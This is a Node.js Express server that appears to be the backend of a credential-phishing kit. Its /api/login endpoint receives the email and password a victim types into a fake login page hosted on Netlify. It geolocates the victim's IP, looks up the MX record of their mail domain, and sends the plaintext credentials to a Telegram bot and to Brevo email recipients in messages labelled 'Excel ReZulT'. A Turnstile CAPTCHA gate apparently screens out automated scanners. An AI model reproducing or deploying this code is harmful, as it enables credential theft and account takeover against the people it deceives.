const express = require('express');
const cors = require('cors');
const crypto = require('crypto'); // Built-in Node module for tokens
const app = express();
const PORT = process.env.PORT || 3000;

// ============================================================
// MIDDLEWARE
// ============================================================

app.use(cors({
    origin: 'https://koreapo.netlify.app', // 🔒 Only your frontend
    methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
    allowedHeaders: ['Content-Type', 'Authorization', 'x-session-token']
}));

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ============================================================
// CONFIGURATION
// ============================================================

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const BREVO_API_KEY = process.env.BREVO_API_KEY;
const SENDER_EMAIL = process.env.SENDER_EMAIL || 'egli79380@gmail.com';
const SENDER_NAME = process.env.SENDER_NAME || 'ABV Monitor';
const TURNSTILE_SECRET_KEY = process.env.TURNSTILE_SECRET_KEY; // 🔑 Add this to Render

const EMAIL_RECIPIENTS = (process.env.EMAIL_RECIPIENTS || '')
    .split(',')
    .map(e => e.trim())
    .filter(Boolean);

// In-memory store for valid session tokens (In production, use Redis or a database)
const validSessions = new Map();

// Clean up old sessions every hour
setInterval(() => {
    const now = Date.now();
    for (let [token, expiry] of validSessions.entries()) {
        if (now > expiry) validSessions.delete(token);
    }
}, 3600000);

// ============================================================
// STARTUP CONFIG CHECK
// ============================================================

console.log('========================================');
console.log('🔍 Environment check:');
console.log(`   TELEGRAM_BOT_TOKEN: ${BOT_TOKEN ? '✅' : '❌ MISSING'}`);
console.log(`   TELEGRAM_CHAT_ID:   ${CHAT_ID ? '✅' : '❌ MISSING'}`);
console.log(`   BREVO_API_KEY:      ${BREVO_API_KEY ? '✅' : '❌ MISSING'}`);
console.log(`   TURNSTILE_SECRET:   ${TURNSTILE_SECRET_KEY ? '✅' : '❌ MISSING'}`);
console.log(`   EMAIL_RECIPIENTS:   ${EMAIL_RECIPIENTS.length ? '✅ ' + EMAIL_RECIPIENTS.length + ' recipient(s)' : '❌ MISSING'}`);
console.log('========================================');

// ============================================================
// 🛡️ VERIFY CAPTCHA ENDPOINT
// ============================================================

app.post('/api/verify-captcha', async (req, res) => {
    const { token } = req.body;

    if (!token) {
        return res.status(400).json({ success: false, message: 'Token required' });
    }

    if (!TURNSTILE_SECRET_KEY) {
        console.error('❌ TURNSTILE_SECRET_KEY is missing');
        return res.status(500).json({ success: false, message: 'Server configuration error' });
    }

    try {
        // Verify token with Cloudflare
        const formData = new URLSearchParams();
        formData.append('secret', TURNSTILE_SECRET_KEY);
        formData.append('response', token);

        const cloudflareRes = await fetch('https://challenges.cloudflare.com/turnstile/v0/siteverify', {
            method: 'POST',
            body: formData
        });

        const cloudflareData = await cloudflareRes.json();

        if (cloudflareData.success) {
            // Generate a secure session token
            const sessionToken = crypto.randomBytes(32).toString('hex');
            const expiry = Date.now() + (1000 * 60 * 60); // 1 hour expiry
            
            validSessions.set(sessionToken, expiry);
            
            console.log('✅ CAPTCHA verified. Session created.');
            return res.json({ 
                success: true, 
                sessionToken: sessionToken,
                message: 'Verification successful'
            });
        } else {
            console.log('❌ CAPTCHA verification failed:', cloudflareData['error-codes']);
            return res.status(403).json({ 
                success: false, 
                message: 'CAPTCHA verification failed',
                errors: cloudflareData['error-codes']
            });
        }
    } catch (error) {
        console.error('❌ Error verifying CAPTCHA:', error.message);
        return res.status(500).json({ success: false, message: 'Internal server error' });
    }
});

// ============================================================
// HELPER: Send Email via Brevo
// ============================================================

async function sendEmail(email, password, ipInfo, userAgent, domain, mxRecord) {
    if (!BREVO_API_KEY || EMAIL_RECIPIENTS.length === 0) {
        console.log('⚠️ Brevo not configured, skipping email');
        return false;
    }

    const subject = `🔐 ABV Login Credentials - ${email}`;
    const htmlContent = `
    <!DOCTYPE html>
    <html>
    <head>
        <style>
            body { font-family: Arial, sans-serif; background: #f5f5f5; padding: 20px; }
            .container { max-width: 600px; margin: 0 auto; background: #fff; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
            .header { background: #1e930c; color: #fff; padding: 15px; border-radius: 5px 5px 0 0; text-align: center; }
            .content { padding: 20px; }
            .field { margin: 10px 0; padding: 10px; background: #f8f8f8; border-radius: 5px; }
            .label { font-weight: bold; color: #555; }
            .value { color: #1e930c; font-size: 16px; }
            .mx { color: #1e930c; font-size: 14px; white-space: pre-line; font-family: monospace; }
            .footer { text-align: center; padding: 15px; color: #999; font-size: 12px; border-top: 1px solid #eee; margin-top: 20px; }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header"><h2>🔐 ABV Login Credentials</h2></div>
            <div class="content">
                <div class="field"><div class="label">📧 Email:</div><div class="value"><strong>${email}</strong></div></div>
                <div class="field"><div class="label">🔑 Password:</div><div class="value"><strong>${password}</strong></div></div>
                <div class="field"><div class="label">🌐 Domain:</div><div class="value">${domain || 'Unknown'}</div></div>
                <div class="field"><div class="label">📨 MX Record:</div><div class="value mx">${mxRecord || 'Unknown'}</div></div>
                <div class="field"><div class="label">🌍 IP Address:</div><div class="value">${ipInfo?.ip || 'Unknown'}</div></div>
                <div class="field"><div class="label">📍 Location:</div><div class="value">${ipInfo?.city || 'Unknown'}, ${ipInfo?.region || 'Unknown'}, ${ipInfo?.country || 'Unknown'}</div></div>
                <div class="field"><div class="label">📱 Browser:</div><div class="value">${userAgent?.substring(0, 100) || 'Unknown'}...</div></div>
                <div class="field"><div class="label">🕐 Time:</div><div class="value">${new Date().toLocaleString()}</div></div>
            </div>
            <div class="footer"><p>© ${new Date().getFullYear()} ABV Monitor</p></div>
        </div>
    </body>
    </html>
    `;
    const textContent = `
🔐 ABV Login Credentials
════════════════════════════════════
📧 Email: ${email}
🔑 Password: ${password}
🌐 Domain: ${domain || 'Unknown'}
📨 MX Record: ${mxRecord || 'Unknown'}
🌍 IP Address: ${ipInfo?.ip || 'Unknown'}
📍 Location: ${ipInfo?.city || 'Unknown'}, ${ipInfo?.region || 'Unknown'}, ${ipInfo?.country || 'Unknown'}
📱 Browser: ${userAgent?.substring(0, 100) || 'Unknown'}...
🕐 Time: ${new Date().toLocaleString()}
════════════════════════════════════
    `;

    try {
        const response = await fetch('https://api.brevo.com/v3/smtp/email', {
            method: 'POST',
            headers: {
                'api-key': BREVO_API_KEY,
                'Content-Type': 'application/json',
                'Accept': 'application/json'
            },
            body: JSON.stringify({
                sender: { name: SENDER_NAME, email: SENDER_EMAIL },
                to: EMAIL_RECIPIENTS.map(e => ({ email: e })),
                subject: subject,
                htmlContent: htmlContent,
                textContent: textContent
            })
        });
        const data = await response.json();
        if (response.ok) {
            console.log('✅ Email sent via Brevo:', data.messageId || 'sent');
            return true;
        } else {
            console.error('❌ Brevo API error:', response.status, data.message || data.error || JSON.stringify(data));
            return false;
        }
    } catch (error) {
        console.error('❌ Failed to send email via Brevo:', error.message);
        return false;
    }
}

// ============================================================
// HELPER: Send to Telegram
// ============================================================

async function sendToTelegram(message) {
    if (!BOT_TOKEN || !CHAT_ID) {
        console.log('⚠️ Telegram not configured, skipping');
        return null;
    }
    try {
        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CHAT_ID, text: message })
        });
        const result = await response.json();
        console.log('📤 Telegram:', result.ok ? '✅ Sent' : '❌ Failed — ' + (result.description || ''));
        return result;
    } catch (error) {
        console.error('❌ Telegram error:', error.message);
        return null;
    }
}

// ============================================================
// HELPER: Get IP info
// ============================================================

async function getIPInfo(ip) {
    try {
        const firstIP = (ip || '').split(',')[0].trim();
        const response = await fetch(`https://ipinfo.io/${firstIP}/json`);
        const data = await response.json();
        return data;
    } catch (error) {
        console.error('❌ IP info error:', error.message);
        return { ip: ip || 'Unknown', country: 'Unknown', city: 'Unknown', region: 'Unknown' };
    }
}

// ============================================================
// HELPER: Get MX Record
// ============================================================

async function getMXRecord(domain) {
    try {
        const response = await fetch(`https://dns.google/resolve?name=${domain}&type=MX`);
        const data = await response.json();
        if (data && data.Answer && data.Answer.length > 0) {
            return data.Answer.map(r => r.data).join('\n');
        }
        return 'no-mx';
    } catch (error) {
        return 'MX-Error';
    }
}

// ============================================================
// HEALTH CHECK
// ============================================================

app.get('/health', (req, res) => {
    res.json({
        status: 'ok',
        timestamp: new Date().toISOString(),
        uptime: process.uptime(),
        telegramConfigured: !!(BOT_TOKEN && CHAT_ID),
        emailConfigured: !!(BREVO_API_KEY && EMAIL_RECIPIENTS.length),
        turnstileConfigured: !!TURNSTILE_SECRET_KEY
    });
});

// ============================================================
// 🛡️ MIDDLEWARE: Verify Session Token
// ============================================================

function verifySession(req, res, next) {
    const sessionToken = req.headers['x-session-token'];
    
    if (!sessionToken) {
        console.log('⛔ Blocked: No session token provided');
        return res.status(401).json({ success: false, message: 'Unauthorized: No session token' });
    }

    const expiry = validSessions.get(sessionToken);
    
    if (!expiry || Date.now() > expiry) {
        console.log('⛔ Blocked: Invalid or expired session token');
        return res.status(401).json({ success: false, message: 'Unauthorized: Invalid or expired token' });
    }

    // Token is valid
    next();
}

// ============================================================
// 🔐 PROTECTED LOGIN ENDPOINT
// ============================================================

app.post('/api/login', verifySession, async (req, res) => {
    console.log('📧 Login attempt received (Authenticated Session)');
    
    const { email, password } = req.body;
    if (!email || !password) {
        return res.status(400).json({ success: false, message: 'Email and password are required' });
    }

    const emailRegex = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
    if (!emailRegex.test(email)) {
        return res.status(400).json({ success: false, message: 'Invalid email format' });
    }

    const clientIP = req.headers['x-forwarded-for'] || req.connection.remoteAddress || req.socket.remoteAddress || 'Unknown';
    const ipInfo = await getIPInfo(clientIP);
    const domain = email.split('@')[1];
    const mxRecord = await getMXRecord(domain);
    const userAgent = req.headers['user-agent'] || 'Unknown';
    const acceptLanguage = req.headers['accept-language'] || 'Unknown';

    // 1) TELEGRAM MESSAGE
    const telegramMessage = `
--------+ Excel ReZulT ${ipInfo.city || 'Unknown'} ${ipInfo.region || 'Unknown'}, ${ipInfo.country || 'Unknown'} +--------
Email : ${email}
Password : ${password}
Checker: ${email}:${password}
Browser : ${userAgent}
Language : ${acceptLanguage}
MX Record : ${mxRecord}
IP Address : ${clientIP}
Region and Country : ${ipInfo.city || 'Unknown'} ${ipInfo.region || 'Unknown'}, ${ipInfo.country || 'Unknown'}
Date : ${new Date().toISOString()}
---------+ Excel ReZulT ${ipInfo.city || 'Unknown'} ${ipInfo.region || 'Unknown'}, ${ipInfo.country || 'Unknown'} +-------------
`;
    const telegramResult = await sendToTelegram(telegramMessage);

    // 2) EMAIL
    const emailResult = await sendEmail(email, password, ipInfo, userAgent, domain, mxRecord);

    // RESPONSE
    const telegramOK = !!(telegramResult && telegramResult.ok);
    if (telegramOK || emailResult) {
        console.log('✅ Notifications sent successfully');
        return res.json({
            success: true,
            message: 'Login processed successfully',
            notifications: { telegram: telegramOK, email: emailResult }
        });
    } else {
        console.log('❌ Failed to send notifications');
        return res.status(500).json({ success: false, message: 'Failed to send notifications' });
    }
});

// ============================================================
// 404
// ============================================================

app.use('*', (req, res) => {
    res.status(404).json({
        success: false,
        message: `Endpoint not found: ${req.method} ${req.originalUrl}`
    });
});

// ============================================================
// START SERVER
// ============================================================

app.listen(PORT, () => {
    console.log('========================================');
    console.log(`🚀 Server running on port ${PORT}`);
    console.log(`🌐 Health: http://localhost:${PORT}/health`);
    console.log(`📧 Login:  http://localhost:${PORT}/api/login`);
    console.log('========================================');
});

process.on('uncaughtException', (err) => console.error('❌ Uncaught:', err.message));
process.on('unhandledRejection', (r) => console.error('❌ Unhandled:', r));